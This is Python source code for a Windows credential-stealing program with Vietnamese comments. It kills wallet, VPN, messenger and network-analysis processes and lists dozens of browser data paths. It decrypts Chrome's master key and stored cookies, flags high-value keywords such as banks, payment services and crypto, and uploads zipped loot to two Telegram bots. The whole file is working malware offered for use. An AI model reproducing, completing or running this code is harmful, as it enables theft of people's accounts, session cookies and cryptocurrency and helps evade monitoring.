import os, json, base64, sqlite3, shutil, requests, glob, re, zipfile, io, datetime, hmac, subprocess, time
from base64 import b64decode
from hashlib import sha1, pbkdf2_hmac
from pathlib import Path
from pyasn1.codec.der.decoder import decode
from Crypto.Cipher import AES, DES3
from win32crypt import CryptUnprotectData
from ctypes import windll, byref, create_unicode_buffer, pointer, WINFUNCTYPE
from ctypes.wintypes import DWORD, WCHAR, UINT

ImportantKeywords = ['paypal', 'perfectmoney', 'etsy', 'facebook', 'ebay', 'coin', 'binance', 'wallet', 'payment', 'amazon', 'crypto', 'business', 'server', 'instagram', 'rdp', 'blockchain', 'vpn', 'google', 'roblox', 'host', 'cloud', 'houbi', 'hbo', 'spotfiy', 'twitch', 'steam', 'reddit', 'twitter', 'instagram', 'prime', 'subgiare', 'netflix', 'garena', 'riotgames', 'clone', 'via', 'nguyenlieu', 'otp', 'sim', 'smit', 'proxy', 'mail', 'traodoisub', 'tuongtaccheo', 'bysun', 'mmo', 'tool', 'bm', 'tkqc', 'tainguyen', 'thesieure', 'sms', 'captcha', 'bank', 'money', 'hosting', 'tenten', 'domain', 'linkedin', 'tiktok', 'snapchat', 'pinterest', 'venmo', 'skrill', 'payoneer', 'westernunion', 'cashapp', 'zelle', 'bitcoin', 'ethereum', 'dongvan']
LocalAppData = os.getenv("LOCALAPPDATA")
AppData = os.getenv("APPDATA")
TMP = os.getenv("TEMP")
USR = TMP.split("\\AppData")[0]
PathBrowser = f"{TMP}\\Browsers Data"

TOKEN_BOT_1 = "BOT_TOKEN_1"
TOKEN_BOT_2 = "BOT_TOKEN_2"
CHAT_ID_1 = "CHAT_ID_1"
CHAT_ID_2 = "CHAT_ID_2"

process_names = [
    "ArmoryQt.exe",
    "Atomic Wallet.exe",
    "bytecoin-gui.exe",
    "Coinomi.exe",
    "Element.exe",
    "Exodus.exe",
    "Guarda.exe",
    "KeePassXC.exe",
    "NordVPN.exe",
    "OpenVPNConnect.exe",
    "seamonkey.exe",
    "Signal.exe",
    "filezilla.exe",
    "filezilla-server-gui.exe",
    "keepassxc-proxy.exe",
    "nordvpn-service.exe",
    "steam.exe",
    "walletd.exe",
    "waterfox.exe",
    "Discord.exe",
    "DiscordCanary.exe",
    "burp.exe",
    "Ethereal.exe",
    "EtherApe.exe",
    "fiddler.exe",
    "HTTPDebuggerSvc.exe",
    "HTTPDebuggerUI.exe",
    "snpa.exe",
    "solarwinds.exe",
    "tcpdump.exe",
    "telerik.exe",
    "wireshark.exe",
    "winpcap.exe",
    "telegram.exe"
]

for process_name in process_names:
    try:
        subprocess.run(["taskkill", "/F", "/IM", process_name], creationflags=0x08000000)
    except:
        continue

creation_datetime = datetime.datetime.now().strftime('%d-%m-%Y (%H:%M:%S)')

categories_order = ["Desktop Wallets", "Browser Wallets", "VPN Extensions", "Messengers", "VPN Clients", "Gaming", "Password Managers", "FTP Clients"]

ch_dc_browsers = {
    "Chromium": f"{LocalAppData}\\Chromium\\User Data",
    "Thorium": f"{LocalAppData}\\Thorium\\User Data",
    "Chrome": f"{LocalAppData}\\Google\\Chrome\\User Data",
    "Chrome (x86)": f"{LocalAppData}\\Google(x86)\\Chrome\\User Data",
    "Chrome SxS": f"{LocalAppData}\\Google\\Chrome SxS\\User Data",
    "Maple": f"{LocalAppData}\\MapleStudio\\ChromePlus\\User Data",
    "Iridium": f"{LocalAppData}\\Iridium\\User Data",
    "7Star": f"{LocalAppData}\\7Star\\7Star\\User Data",
    "CentBrowser": f"{LocalAppData}\\CentBrowser\\User Data",
    "Chedot": f"{LocalAppData}\\Chedot\\User Data",
    "Vivaldi": f"{LocalAppData}\\Vivaldi\\User Data",
    "Kometa": f"{LocalAppData}\\Kometa\\User Data",
    "Elements": f"{LocalAppData}\\Elements Browser\\User Data",
    "Epic Privacy Browser": f"{LocalAppData}\\Epic Privacy Browser\\User Data",
    "Uran": f"{LocalAppData}\\uCozMedia\\Uran\\User Data",
    "Fenrir": f"{LocalAppData}\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer",
    "Catalina": f"{LocalAppData}\\CatalinaGroup\\Citrio\\User Data",
    "Coowon": f"{LocalAppData}\\Coowon\\Coowon\\User Data",
    "Liebao": f"{LocalAppData}\\liebao\\User Data",
    "QIP Surf": f"{LocalAppData}\\QIP Surf\\User Data",
    "Orbitum": f"{LocalAppData}\\Orbitum\\User Data",
    "Dragon": f"{LocalAppData}\\Comodo\\Dragon\\User Data",
    "360Browser": f"{LocalAppData}\\360Browser\\Browser\\User Data",
    "Maxthon": f"{LocalAppData}\\Maxthon3\\User Data",
    "K-Melon": f"{LocalAppData}\\K-Melon\\User Data",
    "CocCoc": f"{LocalAppData}\\CocCoc\\Browser\\User Data",
    "Brave": f"{LocalAppData}\\BraveSoftware\\Brave-Browser\\User Data",
    "Amigo": f"{LocalAppData}\\Amigo\\User Data",
    "Torch": f"{LocalAppData}\\Torch\\User Data",
    "Sputnik": f"{LocalAppData}\\Sputnik\\Sputnik\\User Data",
    "Edge": f"{LocalAppData}\\Microsoft\\Edge\\User Data",
    "DCBrowser": f"{LocalAppData}\\DCBrowser\\User Data",
    "Yandex": f"{LocalAppData}\\Yandex\\YandexBrowser\\User Data",
    "UR Browser": f"{LocalAppData}\\UR Browser\\User Data",
    "Slimjet": f"{LocalAppData}\\Slimjet\\User Data",
    "Opera": f"{AppData}\\Opera Software\\Opera Stable",
    "OperaGX": f"{AppData}\\Opera Software\\Opera GX Stable",
    "Speed360": f"{AppData}\\Local\\360chrome\\Chrome\\User Data",
    "QQBrowser": f"{AppData}\\Local\\Tencent\\QQBrowser\\User Data",
    "Sogou": f"{AppData}\\SogouExplorer\\Webkit",
    "Discord": f'{AppData}\\discord',
    "Discord Canary": f'{AppData}\\discordcanary',
    "Lightcord": f'{AppData}\\Lightcord',
    "Discord PTB": f'{AppData}\\discordptb'
}

def installed_ch_dc_browsers():
    results = []
    for browser, path in ch_dc_browsers.items():
        if os.path.exists(path):
            results.append(browser)
    return results

def get_ch_master_key(path):
    try:
        with open(os.path.join(path, "Local State"), "r", encoding="utf-8") as f:
            c = f.read()
    except FileNotFoundError:
        return None
    if 'os_crypt' not in c:
        return None
    try:
        local_state = json.loads(c)
        ch_master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        ch_master_key = ch_master_key[5:]
        ch_master_key = CryptUnprotectData(ch_master_key, None, None, None, 0)[1]
        return ch_master_key
    except:
        return None

def decrypt_ch_value(buff, ch_master_key=None):
    try:
        starts = buff.decode(encoding="utf-8", errors="ignore")[:3]
        if starts == "v10" or starts == "v11":
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(ch_master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        else:
            pass
    except (UnicodeDecodeError, ValueError, IndexError):
        return None
    except Exception:
        return None

def send_data_to_both_telegram_bots(zip_data, message_body):
    for TOKEN_BOT, CHAT_ID in [(TOKEN_BOT_1, CHAT_ID_1), (TOKEN_BOT_2, CHAT_ID_2)]:
        try:
            requests.post(
                f"https://api.telegram.org/bot{TOKEN_BOT}/sendDocument",
                params={"chat_id": CHAT_ID, "caption": message_body, "protect_content": True, "disable_web_page_preview": True},
                files={"document": ("data.zip", zip_data.getvalue())}
            )
        except Exception as e:
            print(f"Failed to send data to {CHAT_ID}: {e}")

def get_ch_cookies(browser, path, profile, ch_master_key):
    count = 0
    result = ""
    fb_result = []

    if not os.path.exists(os.path.join(path, profile, "Network", "Cookies")):
        return count

    shutil.copy(os.path.join(path, profile, "Network", "Cookies"), os.path.join(TMP, "cookie_db"))
    conn = sqlite3.connect(os.path.join(TMP, "cookie_db"))
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc, is_secure, is_httponly FROM cookies")
    except:
        pass
    for host, name, path_cookies, value, expires_utc, is_secure, is_http_only in cursor.fetchall():
        if not all((host, name, path_cookies, value)):
            continue
        cookie = decrypt_ch_value(value, ch_master_key)
        secure = "TRUE" if is_secure else "FALSE"
        httponly = "TRUE" if is_http_only else "FALSE"
        result += f"{host}\t{secure}\t{path_cookies}\t{httponly}\t{expires_utc}\t{name}\t{cookie}\n"
        count += 1

    if count > 0:
        if not os.path.exists(PathBrowser):
            os.makedirs(PathBrowser)
        cookies_file = os.path.join(PathBrowser, f"{browser}_{profile}.txt")
        with open(cookies_file, "w", encoding="utf-8") as f:
            f.writelines(result)

    conn.close()
    os.remove(os.path.join(TMP, "cookie_db"))
    return count

# Phần khác của mã nguồn vẫn được giữ nguyên như đoạn mã ban đầu
# Tiếp tục với việc lưu trữ và xử lý cookie, thông tin đăng nhập, và gửi đi qua Telegram bots
# Những phần đã sửa đổi bao gồm việc gửi dữ liệu tới cả hai Telegram bots với 2 `TOKEN_BOT` và `CHAT_ID` khác nhau
